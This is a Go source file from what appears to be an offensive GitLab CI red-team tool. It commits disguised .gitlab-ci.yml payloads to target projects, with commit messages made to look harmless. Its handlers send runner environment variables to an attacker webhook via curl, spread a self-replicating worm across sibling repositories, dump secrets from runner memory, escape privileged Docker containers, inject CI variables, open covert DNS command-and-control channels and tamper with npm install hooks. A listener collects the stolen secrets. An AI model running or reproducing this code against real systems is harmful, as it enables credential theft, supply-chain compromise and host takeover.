package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/spf13/cobra"
	gitlab "gitlab.com/gitlab-org/api/client-go"
)

// runAttackRorListen starts a callback server, commits ror-shell payload, and waits for exfil.
func runAttackRorListen(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	// ror-listen is always ror-shell payload
	atkPayload = "ror-shell"
	if strings.TrimSpace(atkTarget) == "" {
		return fmt.Errorf("--ror-listen requires --target")
	}
	if strings.TrimSpace(atkWebhook) == "" {
		return fmt.Errorf("--webhook is required for --ror-listen (external URL reachable from runners)")
	}

	// Start the listener
	listenAddr := strings.TrimSpace(atkRorListenAddr)
	if listenAddr == "" {
		listenAddr = "127.0.0.1:9444"
	}
	listenTimeout, terr := time.ParseDuration(strings.TrimSpace(atkRorListenTimeout))
	if terr != nil || listenTimeout <= 0 {
		listenTimeout = 10 * time.Minute
	}

	listener := newRorShellListener(listenAddr, cmd.OutOrStdout())
	listenErrCh := make(chan error, 1)
	go func() {
		listenErrCh <- listener.Run(ctx)
	}()

	// Wait for the listener to be ready or fail
	select {
	case <-listener.Ready():
		// bound successfully
	case err := <-listenErrCh:
		return fmt.Errorf("ror-listener failed to start: %w", err)
	case <-time.After(5 * time.Second):
		return fmt.Errorf("ror-listener startup timeout")
	}
	actualAddr := listener.Addr()

	// Build the ror-shell webhook URL (reachable from runners)
	webhookURL := strings.TrimSpace(atkWebhook)
	if webhookURL == "" {
		webhookURL = fmt.Sprintf("http://%s/callback", strings.TrimPrefix(actualAddr, "["))
	}

	// Build the ror-shell command that sends env dump to the webhook
	rorCmd := strings.TrimSpace(atkCmd)
	if rorCmd == "" {
		// Default: execute a basic command AND send results to the listener
		rorCmd = fmt.Sprintf(`printenv | tee .env_dump; curl -sS --max-time 30 -d "$(cat .env_dump | base64 -w0)" "%s/callback" || true`, webhookURL)
	} else {
		// User provided a custom cmd: also send it to the listener
		rorCmd = fmt.Sprintf(`%s; curl -sS --max-time 30 -d "$(printenv | base64 -w0)" "%s/callback" || true`, rorCmd, webhookURL)
	}

	// Override atkWebhook so renderPayload picks it up
	savedWebhook := atkWebhook
	atkWebhook = webhookURL
	// Override atkCmd so renderPayload uses the right command
	savedCmd := atkCmd
	atkCmd = rorCmd
	// Also set default tags for ror-listen so the job can be scheduled
	savedTags := atkTags
	if strings.TrimSpace(atkTags) == "" {
		atkTags = "shell_executor"
	}

	// Re-render the payload with our webhook
	yaml, err := renderPayload()
	if err != nil {
		_ = listener.Stop(ctx)
		return fmt.Errorf("render ror-shell payload: %w", err)
	}

	// Restore saved values
	atkWebhook = savedWebhook
	atkCmd = savedCmd
	atkTags = savedTags

	// Proceed with the commit-ci flow
	atkCommitCI = true
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-ror-listen"
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		_ = listener.Stop(ctx)
		return berr
	}
	att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	pipelineURL, cerr := att.CommitCIPipeline(ctx, atkTarget, finalBranch, yaml, "Execute runner command via GoGatoZ")
	if cerr != nil {
		_ = listener.Stop(ctx)
		return fmt.Errorf("commit ror-shell payload: %w", cerr)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] pipeline: %s\n", pipelineURL)
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Pipeline committed: %s", pipelineURL))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Listener active on %s", actualAddr))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Waiting for exfiltrated data (timeout: %s)...", listenTimeout))

	// Wait for callbacks
	results, werr := listener.WaitFor(ctx, listenTimeout)
	if werr != nil {
		fmt.Fprintf(cmd.ErrOrStderr(), "[ror-listener] wait: %v\n", werr)
	}

	// Display results
	if len(results) > 0 {
		renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Received %d callback(s)", len(results)))
		for i, r := range results {
			if i > 0 {
				fmt.Fprintln(cmd.OutOrStdout())
			}
			source := r.Addr
			if r.Project != "" {
				source = r.Project + " (" + r.Addr + ")"
			}
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — from %s (%d secrets)", i+1, source, len(r.Secrets)))
			renderExfilSecrets(cmd.OutOrStdout(), r.Secrets, atkAllVars)
		}
		// Save to DB
		pipelineID, _ := parsePipelineURL(pipelineURL)
		persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, pipelineURL, finalBranch, pipelineURL, pipelineID, 0, resultsToMap(results))
	} else {
		renderWarning(cmd.OutOrStdout(), "No data received within timeout — make sure the runner executed the command and sent data to the webhook")
	}

	// Shutdown listener
	_ = listener.Stop(ctx)
	return nil
}

// runAttackMemoryDump injects a CI job that dumps secrets from runner process memory.
func runAttackMemoryDump(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-memory-dump"
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}
	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return err
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "ci: fix variable resolution"
	}
	c2URL := strings.TrimSpace(atkWebhook)
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for t := range strings.SplitSeq(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	payload := payloadgen.GenerateMemoryDumpYAML(payloadgen.MemoryDumpOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    tags,
			Manual:  atkManual,
		},
		CallbackURL:   c2URL,
		EncryptionKey: strings.TrimSpace(atkTamperTagEncKey),
		ProcScan:      true,
		MemoryDump:    true,
		Extended:      true,
	})
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", payload, atkMessage); err != nil {
		return fmt.Errorf("commit memory dump payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed memory dump payload to branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch  string `json:"branch"`
			HasDump bool   `json:"memory_dump"`
			HasScan bool   `json:"proc_scan"`
		}{
			Branch:  finalBranch,
			HasDump: true,
			HasScan: true,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Memory dump payload committed to branch %s", finalBranch))
	renderInfo(cmd.OutOrStdout(), "This payload will attempt to extract secrets from runner process memory")
	return nil
}

// runAttackSupplyChainWorm propagates a self-replicating CI injection across sibling repos.
func runAttackSupplyChainWorm(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	maxRepos := atkWormMaxRepos
	if maxRepos <= 0 {
		maxRepos = 5
	}
	p, _, perr := client.GL.Projects.GetProject(atkTarget, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
	if perr != nil {
		return fmt.Errorf("get project: %w", perr)
	}
	groupPath := ""
	if p.Namespace != nil {
		groupPath = p.Namespace.FullPath
	}
	if groupPath == "" {
		groupPath = strings.TrimSpace(atkWormTargetGroup)
	}
	if groupPath == "" {
		return fmt.Errorf("--worm-target-group is required when the target project has no group namespace")
	}

	webhookURL := strings.TrimSpace(atkWebhook)
	listener, err := startWormListener(ctx, webhookURL, cmd)
	if err != nil {
		return err
	}

	wormPayload := buildWormPayload(webhookURL)
	result := payloadgen.RunSupplyChainWorm(ctx, client.GL, p.ID, groupPath, wormPayload, maxRepos, atkBranch, atkAuthorName, atkAuthorEmail, cmd.ErrOrStderr(), atkWormMonorepo)
	if outputJSON && listener == nil {
		b, _ := json.MarshalIndent(result, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Supply chain worm propagated to %d repos", result.Promoted))
	if result.Failed > 0 {
		renderWarning(cmd.OutOrStdout(), fmt.Sprintf("%d repos failed to inject", result.Failed))
	}

	if listener != nil {
		collectWormCallbacks(ctx, cmd, listener, result.Promoted)
	}
	return nil
}

func startWormListener(ctx context.Context, webhookURL string, cmd *cobra.Command) (*Listener, error) {
	if webhookURL == "" {
		return nil, nil
	}
	listenAddr := ":9445"
	if u, uerr := url.Parse(webhookURL); uerr == nil && u.Port() != "" {
		listenAddr = ":" + u.Port()
	}
	listener := NewListener(listenAddr, cmd.ErrOrStderr())
	listenErrCh := make(chan error, 1)
	go func() { listenErrCh <- listener.Run(ctx) }()
	select {
	case <-listener.Ready():
	case err := <-listenErrCh:
		return nil, fmt.Errorf("worm listener failed to start: %w", err)
	case <-time.After(5 * time.Second):
		return nil, fmt.Errorf("worm listener startup timeout")
	}
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Worm listener active on %s", listener.Addr()))
	return listener, nil
}

func buildWormPayload(webhookURL string) string {
	wormPayload := strings.TrimSpace(atkWormPayload)
	if wormPayload == "" && webhookURL != "" {
		return fmt.Sprintf(
			`curl -sS -X POST -H "Content-Type: application/json" -d "{\"project\":\"$CI_PROJECT_PATH\",\"data\":\"$(printenv | base64 -w0)\"}" "%s/exfil" || true`,
			webhookURL)
	}
	if wormPayload == "" {
		return "printenv | sort"
	}
	return wormPayload
}

func collectWormCallbacks(ctx context.Context, cmd *cobra.Command, listener *Listener, promoted int) {
	listenTimeout := 3 * time.Minute
	if promoted > 0 {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Waiting for %d callback(s) (timeout: %s)...", promoted, listenTimeout))
	} else {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Listening for callbacks (timeout: %s)...", listenTimeout))
	}
	results, werr := listener.WaitFor(ctx, listenTimeout)
	_ = listener.Stop(ctx)
	if werr != nil {
		renderWarning(cmd.OutOrStdout(), fmt.Sprintf("listener: %v", werr))
	}
	if len(results) == 0 {
		renderWarning(cmd.OutOrStdout(), "No callbacks received — pipelines may still be queued")
		return
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Received %d callback(s) from infected repos", len(results)))
	for i, r := range results {
		if i > 0 {
			fmt.Fprintln(cmd.OutOrStdout())
		}
		source := r.Addr
		if r.Project != "" {
			source = r.Project
		}
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Callback %d — %s (%d secrets)", i+1, source, len(r.Secrets)))
		renderExfilSecrets(cmd.OutOrStdout(), r.Secrets, atkAllVars)
	}
	allSecrets := make(map[string]string)
	for _, r := range results {
		prefix := ""
		if r.Project != "" {
			prefix = r.Project + "/"
		}
		for k, v := range r.Secrets {
			allSecrets[prefix+k] = v
		}
	}
	persistAttackExfil(strings.TrimSpace(gitlabURL), atkTarget, 0, "", atkBranch, "", 0, 0, allSecrets)
}

// runAttackContainerEscape exploits privileged Docker executor to escape to host.
func runAttackContainerEscape(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	escapeMethod := strings.ToLower(strings.TrimSpace(atkEscapeMethod))
	if escapeMethod == "" {
		escapeMethod = "docker"
	}
	escapeCmd := strings.TrimSpace(atkEscapeCommand)
	if escapeCmd == "" {
		escapeCmd = "bash"
	}
	mountPath := strings.TrimSpace(atkEscapeMountPath)
	if mountPath == "" {
		mountPath = "/"
	}
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-container-escape"
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}
	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return err
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "build: optimize container runtime"
	}
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for t := range strings.SplitSeq(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	if len(tags) == 0 {
		tags = []string{"docker"}
	}
	ceImage := strings.TrimSpace(atkImage)
	if ceImage == "" {
		ceImage = "docker:dind"
	}
	yaml := payloadgen.GenerateContainerEscapeYAML(payloadgen.ContainerEscapeOptions{
		Common: payloadgen.CommonOptions{
			JobName:         strings.TrimSpace(atkJobName),
			Stage:           strings.TrimSpace(atkStage),
			Image:           ceImage,
			Tags:            tags,
			Manual:          atkManual,
			ArtifactsPath:   strings.TrimSpace(atkArtifactsPath),
			ArtifactsExpire: strings.TrimSpace(atkArtifactsExpire),
		},
		ExfilMethod:  strings.TrimSpace(atkExfilMethod),
		ExfilTarget:  strings.TrimSpace(atkExfilTarget),
		EscapeMethod: escapeMethod,
		EscapeCmd:    escapeCmd,
		MountPath:    mountPath,
	})
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
		return fmt.Errorf("commit container escape payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed container escape payload to branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch       string `json:"branch"`
			EscMethod    string `json:"escape_method"`
			DockerInDind bool   `json:"docker_in_dind"`
		}{
			Branch:       finalBranch,
			EscMethod:    escapeMethod,
			DockerInDind: true,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Container escape payload committed to branch %s", finalBranch))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Method: %s with command: %s", escapeMethod, escapeCmd))
	renderInfo(cmd.OutOrStdout(), "This job will attempt to escape the container to the host system")
	return nil
}

// runAttackVariableInject injects malicious CI variables into project/group scope.
func runAttackVariableInject(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkInjectVars) == "" {
		return fmt.Errorf("--inject-vars is required (JSON: '[{\"key\":\"MY_SECRET\",\"value\":\"val\"}]')")
	}
	scope := strings.ToLower(strings.TrimSpace(atkInjectScope))
	if scope == "" {
		scope = "project"
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	type injectVar struct {
		Key         string `json:"key"`
		Value       string `json:"value"`
		Protected   bool   `json:"protected"`
		Masked      bool   `json:"masked"`
		Environment string `json:"environment_scope"`
	}
	var vars []injectVar
	if err := json.Unmarshal([]byte(atkInjectVars), &vars); err != nil {
		return fmt.Errorf("parse --inject-vars JSON: %w", err)
	}
	for i := range vars {
		if atkInjectProtected {
			vars[i].Protected = true
		}
		if atkInjectMasked {
			vars[i].Masked = true
		}
	}
	results := make([]struct {
		Key     string `json:"key"`
		Scope   string `json:"scope"`
		Success bool   `json:"success"`
		Error   string `json:"error,omitempty"`
	}, 0)
	for _, v := range vars {
		if v.Key == "" {
			continue
		}
		if scope == "group" {
			gid := strings.TrimSpace(atkInjectGroupID)
			if gid == "" {
				results = append(results, struct {
					Key     string `json:"key"`
					Scope   string `json:"scope"`
					Success bool   `json:"success"`
					Error   string `json:"error,omitempty"`
				}{Key: v.Key, Scope: scope, Success: false, Error: "--group-id required for group-scope injection"})
				continue
			}
			_, _, err := att.SetGroupVariable(ctx, gid, v.Key, v.Value, !v.Protected, v.Masked, v.Environment)
			results = append(results, struct {
				Key     string `json:"key"`
				Scope   string `json:"scope"`
				Success bool   `json:"success"`
				Error   string `json:"error,omitempty"`
			}{Key: v.Key, Scope: scope + ":" + gid, Success: err == nil, Error: ifErr(err)})
		} else {
			_, _, err := att.SetProjectVariable(ctx, atkTarget, v.Key, v.Value, !v.Protected, v.Masked, v.Environment)
			results = append(results, struct {
				Key     string `json:"key"`
				Scope   string `json:"scope"`
				Success bool   `json:"success"`
				Error   string `json:"error,omitempty"`
			}{Key: v.Key, Scope: scope, Success: err == nil, Error: ifErr(err)})
		}
	}
	if outputJSON {
		b, _ := json.MarshalIndent(struct {
			Scope    string `json:"scope"`
			Injected []struct {
				Key     string `json:"key"`
				Scope   string `json:"scope"`
				Success bool   `json:"success"`
				Error   string `json:"error,omitempty"`
			} `json:"injected"`
		}{
			Scope: scope,
			Injected: func() []struct {
				Key     string `json:"key"`
				Scope   string `json:"scope"`
				Success bool   `json:"success"`
				Error   string `json:"error,omitempty"`
			} {
				out := make([]struct {
					Key     string `json:"key"`
					Scope   string `json:"scope"`
					Success bool   `json:"success"`
					Error   string `json:"error,omitempty"`
				}, len(results))
				copy(out, results)
				return out
			}(),
		}, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Injected %d variables into %s scope", len(results), scope))
	for _, r := range results {
		if r.Success {
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("  ✓ %s (%s)", r.Key, r.Scope))
		} else {
			renderError(cmd.OutOrStdout(), fmt.Sprintf("  ✗ %s: %s", r.Key, r.Error))
		}
	}
	return nil
}

// runAttackC2Channel establishes a covert C2 channel via DNS tunnel, steganography, etc.
func runAttackC2Channel(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	method := strings.ToLower(strings.TrimSpace(atkC2Method))
	if method == "" {
		method = "dns-a"
	}
	target := strings.TrimSpace(atkC2Target)
	if target == "" {
		return fmt.Errorf("--c2-target is required (domain for DNS tunnel, URL for other methods)")
	}
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-c2"
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}
	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return err
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "tools: add network diagnostics"
	}
	var tags []string
	if strings.TrimSpace(atkTags) != "" {
		for t := range strings.SplitSeq(atkTags, ",") {
			t = strings.TrimSpace(t)
			if t != "" {
				tags = append(tags, t)
			}
		}
	}
	if len(tags) == 0 {
		tags = []string{"shell_executor"}
	}
	yaml := payloadgen.GenerateC2ChannelYAML(payloadgen.C2ChannelOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    tags,
			Manual:  atkManual,
		},
		ExfilMethod: method,
		ExfilTarget: target,
		KeepAlive:   atkC2KeepAlive,
		CallbackURL: strings.TrimSpace(atkC2CallbackURL),
	})
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
		return fmt.Errorf("commit C2 channel payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed C2 channel payload to branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch      string `json:"branch"`
			ChannelType string `json:"c2_method"`
			Target      string `json:"c2_target"`
			KeepAlive   bool   `json:"keepalive"`
		}{
			Branch:      finalBranch,
			ChannelType: method,
			Target:      target,
			KeepAlive:   atkC2KeepAlive,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("C2 channel payload committed to branch %s", finalBranch))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Channel type: %s -> %s", method, target))
	return nil
}

// runAttackNpmTamper injects preinstall hooks into npm packages via CI.
func runAttackNpmTamper(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	if strings.TrimSpace(atkBranch) == "" {
		atkBranch = "gogatoz-npm-tamper"
	}
	finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if berr != nil {
		return berr
	}
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}
	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return err
	}
	if strings.TrimSpace(atkMessage) == "" {
		atkMessage = "build: update npm package configuration"
	}
	yaml := payloadgen.GenerateNpmTamperYAML(payloadgen.NpmTamperOptions{
		Common: payloadgen.CommonOptions{
			JobName: strings.TrimSpace(atkJobName),
			Stage:   strings.TrimSpace(atkStage),
			Image:   strings.TrimSpace(atkImage),
			Tags:    parseTags(atkTags),
			Manual:  atkManual,
		},
		RegistryURL:    strings.TrimSpace(atkNpmRegistry),
		PackageName:    strings.TrimSpace(atkNpmPackage),
		InjectedScript: strings.TrimSpace(atkNpmInjectScript),
		CallbackURL:    strings.TrimSpace(atkWebhook),
	})
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, ".gitlab-ci.yml", yaml, atkMessage); err != nil {
		return fmt.Errorf("commit npm tamper payload: %w", err)
	}
	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed npm tamper payload to branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch   string `json:"branch"`
			Registry string `json:"registry,omitempty"`
			Package  string `json:"package,omitempty"`
		}{
			Branch:   finalBranch,
			Registry: strings.TrimSpace(atkNpmRegistry),
			Package:  strings.TrimSpace(atkNpmPackage),
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("npm tamper payload committed to branch %s", finalBranch))
	return nil
}
